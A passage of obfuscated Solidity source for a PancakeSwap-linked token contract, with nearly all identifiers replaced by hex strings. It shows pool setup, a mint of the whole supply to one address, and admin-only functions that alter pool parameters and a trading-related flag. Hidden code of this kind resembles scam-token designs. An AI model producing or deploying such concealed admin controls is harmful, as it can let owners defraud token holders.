Ox1438a821db7525441f7c25862bd351b7118dfb011e77808064fac14c4dfac8114e77e29805e3ace28ad204827e419f8fd1ce1705183630d439ea4195fe2cbc7c;Ox47b6102ae26e0d58f4db93b9338436fa6efea1617c70ad990eb26c1bcc7d24adb7119bae6c49015cd4014be696a37dac1d0276b142b823aa5dad063557144be2[Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.WETH()] = 1e18;Oxa39f66c194343dfc48b7bb7bfef0105126065bbd00a107de7d53ccee15f0ad04d1010dc88a5180e36b8a77579e208faa2081b906f497c7e42b686674b90ca91b = 1;if(Ox1438a821db7525441f7c25862bd351b7118dfb011e77808064fac14c4dfac8114e77e29805e3ace28ad204827e419f8fd1ce1705183630d439ea4195fe2cbc7c.Ox0a621344e484d4068ab690ca2040a7738502f4c4b8668bf772c58adbbd3ad8a118e5ee1a0800d659d7717dab33177c1b106ac8ca1201a136f22922ba2805efa4.length>0) {Oxa39f66c194343dfc48b7bb7bfef0105126065bbd00a107de7d53ccee15f0ad04d1010dc88a5180e36b8a77579e208faa2081b906f497c7e42b686674b90ca91b += Ox1438a821db7525441f7c25862bd351b7118dfb011e77808064fac14c4dfac8114e77e29805e3ace28ad204827e419f8fd1ce1705183630d439ea4195fe2cbc7c.Ox0a621344e484d4068ab690ca2040a7738502f4c4b8668bf772c58adbbd3ad8a118e5ee1a0800d659d7717dab33177c1b106ac8ca1201a136f22922ba2805efa4.length;for(uint8 i;i < _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c.length; i++) {address Oxc97dc59aa5a2bdd80e19f8d8d69028f706920c38cc69865b694cae5ae2333a4eac371352021c4f983058ca14e209f640f5d781f8d9a7dac5e1935c3b3183d3a2;if(i==0) Oxc97dc59aa5a2bdd80e19f8d8d69028f706920c38cc69865b694cae5ae2333a4eac371352021c4f983058ca14e209f640f5d781f8d9a7dac5e1935c3b3183d3a2 = pair;else {Ox47b6102ae26e0d58f4db93b9338436fa6efea1617c70ad990eb26c1bcc7d24adb7119bae6c49015cd4014be696a37dac1d0276b142b823aa5dad063557144be2[_Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 == Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728 ? address(this) : _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150] = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxce6925572c4cc8fb5be6c8d24f6b4223933ce97b6242c2b8f82c707e700293059580f8f221afe84b1f4cc43731007b98bfe8f1f63fd7a15bac6768e44cdaee51;Ox47b6102ae26e0d58f4db93b9338436fa6efea1617c70ad990eb26c1bcc7d24adb7119bae6c49015cd4014be696a37dac1d0276b142b823aa5dad063557144be2[_Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 == Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728 ? address(this) : _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3] = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox19911ce19b2a68750e96c6bbe6d7466cc7089c55737895b3a6f7503f73a6fac6bf16c1d7cc2ecc73d9c533d1beda9b080a17b0a4c6efd2bbf89b594cf90a584d;if(_Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 == Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728) _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 = address(this);if(_Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 == Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728) _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 = address(this);Oxc97dc59aa5a2bdd80e19f8d8d69028f706920c38cc69865b694cae5ae2333a4eac371352021c4f983058ca14e209f640f5d781f8d9a7dac5e1935c3b3183d3a2 = IPancakeSwapFactory(Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.factory()).createPair(_Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150,_Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3);}pool storage Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b = Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Oxc97dc59aa5a2bdd80e19f8d8d69028f706920c38cc69865b694cae5ae2333a4eac371352021c4f983058ca14e209f640f5d781f8d9a7dac5e1935c3b3183d3a2];Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.pairAddress = Oxc97dc59aa5a2bdd80e19f8d8d69028f706920c38cc69865b694cae5ae2333a4eac371352021c4f983058ca14e209f640f5d781f8d9a7dac5e1935c3b3183d3a2;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxf1c9f443e2204d36184a898405024370822695a0c30eb9e7e9e9ca9ed056049781cec83f110db2708e2719707bb0b8f746b9d2548f8f9a3f39bc912676a017e0 = IPancakeSwapPair(Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.pairAddress);if(_Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c.length > 0) { Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02 = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox7ee2a18e0838bdbf657fb075ea5bf752b8f2add16921ff1fa1711c8ace024cc83c707b76f3b984a2c80ee400379a6c82868786cf12994743d61f4a68aa72bf95 = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox7ee2a18e0838bdbf657fb075ea5bf752b8f2add16921ff1fa1711c8ace024cc83c707b76f3b984a2c80ee400379a6c82868786cf12994743d61f4a68aa72bf95;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24 = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6 = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxce6925572c4cc8fb5be6c8d24f6b4223933ce97b6242c2b8f82c707e700293059580f8f221afe84b1f4cc43731007b98bfe8f1f63fd7a15bac6768e44cdaee51 = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxce6925572c4cc8fb5be6c8d24f6b4223933ce97b6242c2b8f82c707e700293059580f8f221afe84b1f4cc43731007b98bfe8f1f63fd7a15bac6768e44cdaee51;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox19911ce19b2a68750e96c6bbe6d7466cc7089c55737895b3a6f7503f73a6fac6bf16c1d7cc2ecc73d9c533d1beda9b080a17b0a4c6efd2bbf89b594cf90a584d = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox19911ce19b2a68750e96c6bbe6d7466cc7089c55737895b3a6f7503f73a6fac6bf16c1d7cc2ecc73d9c533d1beda9b080a17b0a4c6efd2bbf89b594cf90a584d;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox685f8edeac7c4a625d1e7969fb6c939eb7fe8dbab21c868063ce1d8501e78a0b0518cb0f95bdf025bd9edbfe56058ad9dcd0de7b61055df11b7e407ca3d5543c = IPancakeSwapPair(_Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox685f8edeac7c4a625d1e7969fb6c939eb7fe8dbab21c868063ce1d8501e78a0b0518cb0f95bdf025bd9edbfe56058ad9dcd0de7b61055df11b7e407ca3d5543c);Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxc7571bf378f58d4699f9f2639e6aceb00a9eb072db96c737144c0d292a5ed1e88109b951b8b33f691cdcada8b3c2d53dd1c0dfb5027654c7721834ebb66ce67a = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxc7571bf378f58d4699f9f2639e6aceb00a9eb072db96c737144c0d292a5ed1e88109b951b8b33f691cdcada8b3c2d53dd1c0dfb5027654c7721834ebb66ce67a;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox72888c6e782c8e2d1bf1e0c2a50808e5a1b2ff3ed7eac2d76ef57b77600f79f30e3c0bee582ef05fdaabe4d7385c58580618052f08dea0fed01459c78556f1f0 = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox72888c6e782c8e2d1bf1e0c2a50808e5a1b2ff3ed7eac2d76ef57b77600f79f30e3c0bee582ef05fdaabe4d7385c58580618052f08dea0fed01459c78556f1f0;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 = i==0 ? Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.WETH() : _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 = i==0 ? address(this) : _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox1fa33859f33fa9e155cc41ef401fb63c9bc335e254b5eeed4ada1d03128f9867d21973a42cbaae2acbbb51541b4f46b5160f2567bf1b02135cce76d58e5231da = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox1fa33859f33fa9e155cc41ef401fb63c9bc335e254b5eeed4ada1d03128f9867d21973a42cbaae2acbbb51541b4f46b5160f2567bf1b02135cce76d58e5231da;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox9b8eb55defbcb1608bc4f0e8674f8cdaab800824252596a6cecaebab5938b98a6ddab9c1cc6bf1998ab8e6266a5f58caa9e691eff25a4ff2066260a0c2f86c01 = _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[i].Ox9b8eb55defbcb1608bc4f0e8674f8cdaab800824252596a6cecaebab5938b98a6ddab9c1cc6bf1998ab8e6266a5f58caa9e691eff25a4ff2066260a0c2f86c01;Ox7d8320f8a24ed1ba028759ecb5657cc8080eba0466f1714748e12069aeb50f2638b8b29924116ab4cb30e5614e9fad4f4d517dfa7aa92378265539a912d86670[Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.pairAddress];}poolList[i] = Oxc97dc59aa5a2bdd80e19f8d8d69028f706920c38cc69865b694cae5ae2333a4eac371352021c4f983058ca14e209f640f5d781f8d9a7dac5e1935c3b3183d3a2;}}addAdmin(Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556);emit Transfer(address(0x0), Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556, Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c);}receive() external payable {}function Oxed9932bb02dc1c6613083496b794ad4644a5d119df813816e150202a7972fbb4810dd3770ae479809b9c6916e4f06f0690bcd6bfcc7c0a066b37dc0f091e2bf8() external view returns (bool) {return !Ox3b1919ff8e4467ffcb18a67ca38f07304b0f90a8b872be269279b1a7c695fc010eb4dac95c1c0eeb1eb7772be310b77fcc8977a19966203e4cd87d9fc91e1c28;}function Ox86a1a1fafddfcc53a494147e486cfd0170205ebff70688640aec843f2537644d8c6b05c557590799ef1c0b1bda62304c0a497f01af0786b518d3167271bcb67a(address Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d440bb0b85fe5a0da97411481b) external view returns (bool) {return Ox309fa20f8837684aa40a99f1f1ddce45692a17baaafb03d060b5814508f616be474e99cee425b1437d592bea7e575ddd6dd2019e78cfa13ee3e3ea3c0332f68a[Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d440bb0b85fe5a0da97411481b];}function Oxf42f544cf762d28ce9f58552c8fb4756c7c6044662f34e535485d3561d9d16386439b37c1eb340b865140a4bd4007e217861be587b606d4118174fefefd1e194(uint256 _index) external view returns (uint256) {return Ox619e8ca4ce2cf8d47c48789372987edfb9cf7b5837a9ac4a0fe796113a4dd5701b13156f72def4a02c11e0864171eaf05982ce2b83b96aeb8a69cc16b61bb04e[_index] / Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;}function Ox0c046fc9455df7a72998d6798fa4e85fd63393aecd7eb34f876eaeba3fe313f62d9495ead47679672de06d137aaf898a7e6e51bf541a5cf2a8d5223c846e6ea7(address Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d440bb0b85fe5a0da97411481b) external view returns (pool memory) {return Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d440bb0b85fe5a0da97411481b];}function totalSupply() external view override returns (uint256) {return Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c;}   function balanceOf(address who) external view override returns (uint256) {return Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[who] / Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;}function Ox9668937a0d5754e2d07438f8f636702ca6810430a454d93f1c209764938afeb083df43e21a4d0a2cda1a8bb42c5f05acf688801af333d12d8b4c3b9c3d1c37fd(address addr) internal view returns (bool) {uint size;assembly { size := extcodesize(addr) }return size > 0;}function allowance(address owner_, address spender)external view override returns (uint256){return Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[owner_][spender];}function decreaseAllowance(address spender, uint256 subtractedValue)external returns (bool){uint256 oldValue = Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[msg.sender][spender];if (subtractedValue >= oldValue) {Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[msg.sender][spender] = 0;} else {Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[msg.sender][spender] = oldValue - subtractedValue;}emit Approval(msg.sender,spender,Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[msg.sender][spender]);return true;}function increaseAllowance(address spender, uint256 addedValue)external returns (bool){Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[msg.sender][spender] = Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[msg.sender][spender] + addedValue;emit Approval(msg.sender,spender,Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[msg.sender][spender]);return true;}function approve(address spender, uint256 value)external override returns (bool){Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[msg.sender][spender] = value;emit Approval(msg.sender, spender, value);return true;}function Oxcb2f7c64956fb5dd0c414f51161debbfed4a86ce3ee2f6797032e800bf6a1541de0001f44fad7926014065182fd4cb1ad0eb38b5d1ff5e457afb5bd1a4d32e40(address Oxb5427edb2b5415025ea511ee83572671ec902f6d940ff349f93e2447e24905c63ae8d9938b37a20a97a3b954fc115814106a63a3cc426d45e2dff2b7d787c5a8, uint256 Ox510dfa438cd46a71097e338b47a6821eeabd5f49c37a66ab730050c5a91aa715180e74e2ca98f2641874f73efb9c3fbd012c1addef40680e47084b7c6f3fd8e5, uint256 Ox30ac86e6cf2feabcf31914c26c72ecfb027e87cdf9118a747299d943171e57354fd6a49813af09aa482ca33fde00dcd52f9e206601c397a820abe4c65a80be81) external onlyAI {Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Oxb5427edb2b5415025ea511ee83572671ec902f6d940ff349f93e2447e24905c63ae8d9938b37a20a97a3b954fc115814106a63a3cc426d45e2dff2b7d787c5a8].Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02 = Ox510dfa438cd46a71097e338b47a6821eeabd5f49c37a66ab730050c5a91aa715180e74e2ca98f2641874f73efb9c3fbd012c1addef40680e47084b7c6f3fd8e5;Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Oxb5427edb2b5415025ea511ee83572671ec902f6d940ff349f93e2447e24905c63ae8d9938b37a20a97a3b954fc115814106a63a3cc426d45e2dff2b7d787c5a8].Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24 = Ox30ac86e6cf2feabcf31914c26c72ecfb027e87cdf9118a747299d943171e57354fd6a49813af09aa482ca33fde00dcd52f9e206601c397a820abe4c65a80be81;}function Oxa8be6c7e356358ca21b2258c1ee44183e6ab6e08c313bc4392e00f0f727ac22a3589d47e0ee4132cb8582fe4a6c7107c1006cf123136bcdc56cd50f9db04bdc9(address Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595, uint256 value) external onlyAI {Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595].Ox1fa33859f33fa9e155cc41ef401fb63c9bc335e254b5eeed4ada1d03128f9867d21973a42cbaae2acbbb51541b4f46b5160f2567bf1b02135cce76d58e5231da = value;}function Oxba18174a0d1d8997cc0e5ffbfd64c744d7c31cbb29e429f65e671e9e252de0850242c6d3be38b3795050fa334cea8dcbc30e9399f511fded5a49a5ba9188ede8(bool Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb) external onlyAI {Ox4546b19be301da5b190ad3d48eb66286926dcf8759e5b67f5d15e4d4e661c90d0bbec58ccd6f2d24b844b3c0503b43edd9d5cbdccf04a6c038cb62d84d6cbb8a = 